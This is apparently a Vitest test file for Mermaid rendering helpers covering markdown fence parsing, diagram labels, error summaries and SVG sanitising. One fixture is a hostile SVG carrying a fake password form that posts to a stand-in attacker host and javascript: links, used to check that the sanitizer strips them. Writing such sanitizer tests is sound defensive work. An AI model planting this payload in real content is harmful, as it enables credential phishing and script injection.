import { describe, expect, it } from "vitest";
import { diagramLabel, errorSummary, openFenceBody, sameFence, stripInteractive } from "../mermaidRender";

describe("openFenceBody", () => {
  it("is null when every fence is closed", () => {
    expect(openFenceBody("a\n```mermaid\nA-->B\n```\nb")).toBeNull();
    expect(openFenceBody("no fences")).toBeNull();
  });
  it("returns the body of a fence still open", () => {
    expect(openFenceBody("```mermaid\nflowchart TD\n  A-->")).toBe("flowchart TD\n  A-->");
    expect(openFenceBody("```ts\nx\n```\n```mermaid\nA-->B\n")).toBe("A-->B");
  });
  it("needs a closing fence at least as long, of the same kind", () => {
    expect(openFenceBody("````md\n```\ninner\n```")).toBe("```\ninner\n```");
  });
  it("sees fences inside list items and quotes", () => {
    expect(openFenceBody("- step\n  ```mermaid\n  A-->")).toBe("  A-->");
    expect(openFenceBody("10. step\n    ```mermaid\n    A-->B")).toBe("    A-->B");
    expect(openFenceBody("> ```mermaid\n> A-->")).toBe("> A-->");
    expect(openFenceBody("> ```mermaid\n> A-->B\n> ```")).toBeNull();
    expect(openFenceBody("- s\n  ```mermaid\n  A-->B\n  ```")).toBeNull();
  });
});

describe("sameFence", () => {
  it("ignores indent and quote marks", () => {
    expect(sameFence("A-->\nB", "  A-->\n  B")).toBe(true);
    expect(sameFence("A-->\nB", "> A-->\n> B")).toBe(true);
    expect(sameFence("A-->B", "A-->C")).toBe(false);
    expect(sameFence("A", null)).toBe(false);
  });
});

describe("stripInteractive", () => {
  const evil =
    '<svg><foreignObject><div><form action="https://evil.example/x?a=>b"><input type="password" name="p"/>Sign in<button>Go</button></form><a href="javascript:alert(1)">link</a><textarea>t</textarea><select><option>o</option></select></div></foreignObject><animate/><a xlink:href="javascript:1"><text>kept</text></a></svg>';
  it("removes forms, inputs, buttons, textareas, selects and links, keeping their contents", () => {
    const out = stripInteractive(evil);
    expect(out).not.toMatch(/<\/?(form|input|button|textarea|select|a)[\s/>]/i);
    expect(out).not.toContain("javascript:");
    expect(out).not.toContain("evil.example");
    expect(out).toContain("Sign in");
    expect(out).toContain("<text>kept</text>");
    expect(out).toContain("<animate/>"); // not confused with <a
  });
});

describe("diagramLabel", () => {
  it("names the diagram type", () => {
    expect(diagramLabel("flowchart TD\n A-->B")).toBe("Flowchart diagram");
    expect(diagramLabel("%%{init: {}}%%\nsequenceDiagram\n A->>B: hi")).toBe("Sequence diagram");
    expect(diagramLabel("weird")).toBe("Mermaid diagram");
  });
});

describe("errorSummary", () => {
  it("keeps the parse error line and the expecting line, without the caret art", () => {
    const e = new Error("Parse error on line 3:\n...A[Start] -->\n-----------------^\nExpecting 'NODE_STRING', got 'EOF'");
    expect(errorSummary(e)).toBe("Parse error on line 3: Expecting 'NODE_STRING', got 'EOF'");
  });
  it("falls back to the first line", () => {
    expect(errorSummary(new Error("\nSomething broke\nmore"))).toBe("Something broke");
  });
});
